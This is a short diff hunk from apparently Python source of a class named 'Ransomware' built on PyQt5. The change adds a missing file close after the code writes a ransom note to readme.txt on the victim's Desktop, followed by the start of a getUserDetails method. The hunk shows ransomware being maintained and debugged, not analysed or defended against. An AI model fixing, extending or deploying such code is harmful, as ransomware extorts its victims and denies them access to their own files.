@@ -34,6 +34,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):
 		try:
 			f = open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt","w+")
 			f.write(note)
+			f.close()
 		except:
 			pass
 	def getUserDetails(self):
